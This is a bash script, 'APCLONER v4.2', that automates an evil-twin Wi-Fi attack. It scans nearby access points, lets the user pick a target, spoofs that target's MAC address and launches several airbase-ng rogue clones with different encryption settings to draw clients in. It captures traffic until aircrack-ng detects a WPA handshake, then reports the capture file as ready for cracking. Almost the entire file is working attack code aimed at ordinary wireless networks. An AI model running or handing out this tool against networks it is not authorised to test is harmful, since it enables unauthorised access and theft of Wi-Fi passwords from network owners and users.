#!/bin/bash

# Color definitions
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[0;33m'
CYAN='\033[0;36m'
RESET='\033[0m'

# ASCII Art and help screen
display_help() {
    echo -e "${YELLOW}"
    echo "      ___    ____  _   APCLONER v4.2   ____  ___  _  _  ____"
    echo
    echo "By: Deley Selem"
    echo 
    echo "Access point cloning program for passive handshakes capture."
    echo -e "${RESET}"
    echo -e "${YELLOW}AP Cloner v4 - Interactive AP cloning tool${RESET}"
    echo -e "${GREEN}Usage:${RESET} sudo $0 [MAC] [SSID] [CHANNEL]"
    echo -e "\n${YELLOW}Options:${RESET}"
    echo -e "  -h, --help    Show this help screen"
}

# Cleanup function
cleanup() {
    echo -n "Configuring network settings..."
    for i in {0..4}; do
        sudo iw mon$i del 2>/dev/null |
        echo -n "."
    done
    sudo airmon-ng check kill >/dev/null 2>&1 && echo -n "."
    sudo rm -f scanresults-*.csv scanresults.tmp 2>/dev/null && echo -n "."
    sudo service NetworkManager start && echo -n "."
    sudo service wpa_supplicant start && echo -n "."
    sudo rfkill unblock all && echo -n "."
    sudo airmon-ng stop wlan0mon | echo -n "."
    echo "OK"
}

# Scan networks in xterm window
scan_networks() {
    #cleanup
    sudo rfkill unblock all
    sudo service NetworkManager start
    sudo service wpa_supplicant start
    echo -e "${CYAN}Launching scanner...${RESET}"
    xterm -T "AP Scanner" -e "airodump-ng wlan0 -w scanresults --output-format csv"
    parse_scan_results
}

# Parse scan results
parse_scan_results() {
    local csv_file=$(ls -t scanresults-*.csv 2>/dev/null | head -1)
    
    if [ -z "$csv_file" ]; then
        echo -e "${RED}No scan results found!${RESET}"
        return 1
    fi

    echo -e "\n${YELLOW}Detected Access Points:${RESET}"
    echo -e "NUM\tBSSID\t\tCHANNEL\tESSID"
    awk -F',' '
    BEGIN {
        bssid_col = 0
        channel_col = 0
        essid_col = 0
    }
    /^BSSID/ {
        # Dynamically find column indices from header
        for (i = 1; i <= NF; i++) {
            gsub(/ /, "", $i)  # Remove spaces from header fields
            if ($i == "BSSID") bssid_col = i
            if ($i == "channel") channel_col = i
            if ($i == "ESSID") essid_col = i
        }
        getline  # Skip to the first data line
        while ($0 !~ /Station MAC/ && $0 !~ /^$/) {
            if (bssid_col && channel_col && essid_col) {
                bssid = $bssid_col
                channel = $channel_col
                essid = $essid_col
                gsub(/ /, "", bssid)      # Clean BSSID
                gsub(/ /, "", channel)     # Clean channel
                gsub(/^[ \t]+|[ \t]+$/, "", essid)  # Trim ESSID
                printf "%s\t%s\t%s\n", bssid, channel, essid
            }
            getline
        }
    }' "$csv_file" | nl -w4 -s'> ' | tee scanresults.tmp

    total_aps=$(wc -l < scanresults.tmp)
    [ "$total_aps" -eq 0 ] && { echo -e "${RED}No APs found!${RESET}"; return 1; }

    while true; do
        read -p $'\n'"Select AP number (1-$total_aps): " ap_num
        [[ "$ap_num" =~ ^[0-9]+$ ]] && [ "$ap_num" -ge 1 ] && [ "$ap_num" -le "$total_aps" ] && break
        echo -e "${RED}Invalid input!${RESET}"
    done

    selected=$(sed -n "${ap_num}p" scanresults.tmp)
    # Extract data after "> " and split by tabs
    data_part=$(echo "$selected" | sed -E 's/^[[:space:]]*[0-9]+>[[:space:]]*//')
    mac=$(echo "$data_part" | awk -F'\t' '{print $1}')
    channel=$(echo "$data_part" | awk -F'\t' '{print $2}')
    ssid=$(echo "$data_part" | awk -F'\t' '{print $3}')

    echo -e "\n${GREEN}Selected Target:${RESET}"
    echo -e "MAC: ${YELLOW}$mac${RESET}"
    echo -e "SSID: ${CYAN}$ssid${RESET}"
    echo -e "Channel: ${GREEN}$channel${RESET}"
    
    read -p $'\n'"Press Enter to start cloning..."
    setup_clones "$mac" "$ssid" "$channel"
}

# Manual AP input
input_ap_data() {
    sudo rfkill unblock all
    read -p "Enter MAC address:" mac
    read -p "Enter ESSID:" ssid
    read -p "Enter channel:" channel
    setup_clones "$mac" "$ssid" "$channel"
}

# Main cloning function
# Main cloning function
setup_clones() {
    local mac="$1"
    local ssid="$2"
    local channel="$3"
    
    cleanup
    
    echo -e -n "\n${CYAN}Creating monitor interfaces...${RESET}"
    for i in {0..4}; do
        sudo iw wlan0 interface add mon$i type monitor | echo -n "." &&
        sudo airmon-ng mon$i start | echo -n "." &&
        sudo ifconfig mon$i down | echo -n "." &&
        sudo macchanger -m "$mac" mon$i | echo -n "." &&
        sudo ifconfig mon$i up | echo -n "." &&
        sudo iw mon$i set channel "$channel" | echo -n "."
	done
    echo "OK"

    echo -e "\n${CYAN}Starting attack windows...${RESET}"
    airbase_pids=()
    xterm -e "airbase-ng -a $mac -c $channel --essid '$ssid' mon1" & airbase_pids+=($!)
    xterm -e "airbase-ng -a $mac -c $channel --essid '$ssid' -W 1 mon2" & airbase_pids+=($!)
    xterm -e "airbase-ng -a $mac -c $channel --essid '$ssid' -W 1 -z 2 mon3" & airbase_pids+=($!)
    xterm -e "airbase-ng -a $mac -c $channel --essid '$ssid' -W 1 -Z 4 mon4" & airbase_pids+=($!)
    xterm -e "airodump-ng -w cap --channel $channel mon0" & airodump_pid=$!

    # Handshake checker
    temp_file=$(mktemp)
    (
    while true; do
        latest_cap=$(ls -t cap-*.cap 2>/dev/null | head -1)
        if [[ -n "$latest_cap" ]]; then
            if aircrack-ng "$latest_cap" 2>/dev/null | grep -q "1 handshake"; then
                echo "$latest_cap" > "$temp_file"
                kill $airodump_pid 2>/dev/null
                for pid in "${airbase_pids[@]}"; do
                    kill $pid 2>/dev/null
                done
                pkill -f "airbase-ng -a $mac" 2>/dev/null
                pkill -f "airodump-ng -w cap" 2>/dev/null
                break
            fi
        fi
        sleep 10
    done
    ) &
    checker_pid=$!

    # Wait for handshake detection
    wait $checker_pid 2>/dev/null
    latest_cap=$(cat "$temp_file" 2>/dev/null)
    rm -f "$temp_file"

    echo -e "\n${GREEN}[+] Handshake captured in file: ${YELLOW}$latest_cap${RESET}"
    echo -e "${GREEN}[+] The file is ready to be cracked with aircrack-ng.${RESET}\n"
    echo -e "${GREEN}Recording channel $channel with cloned AP! Stop with Ctrl + C${RESET}"
}

# Main menu
main_menu() {
    display_help
    while true; do
        echo -e "\n${CYAN}Main Menu:${RESET}"
        echo -e "1) Scan networks"
        echo -e "2) Manual input"
        echo -e "3) Exit"
        read -p "Select: " choice

        case $choice in
            1) scan_networks ;;
            2) input_ap_data ;;
            3) exit 0 ;;
            *) echo -e "${RED}Invalid option!${RESET}" ;;
        esac
    done
}

# Initial checks
[ "$EUID" -ne 0 ] && { echo -e "${RED}Run as root!${RESET}"; exit 1; }
[[ "$1" == "-h" || "$1" == "--help" ]] && display_help && exit 0
#[ "$#" -ne 0 ] && { echo -e "${RED}Invalid args!${RESET}"; display_help; exit 1; }

# Handle direct execution with arguments
if [ "$#" -eq 3 ]; then
  #  if ! validate_mac "$1"; then
   #     echo -e "${RED}Invalid MAC format! Use xx:xx:xx:xx:xx:xx${RESET}"
   #     exit 1
   # fi
   # if [ -z "$2" ]; then
   ##     echo -e "${RED}SSID cannot be empty!${RESET}"
    #    exit 1
   # fi
   # if ! validate_channel "$3"; then
   #     echo -e "${RED}Invalid channel! Use 1-14${RESET}"
   #     exit 1
   # fi

    trap cleanup EXIT
    setup_clones "$1" "$2" "$3"
    exit 0
elif [ "$#" -ne 0 ]; then
    echo -e "${RED}Invalid arguments! Use: sudo $0 [MAC] [SSID] [CHANNEL]${RESET}"
    display_help
fi  

trap cleanup EXIT
main_menu
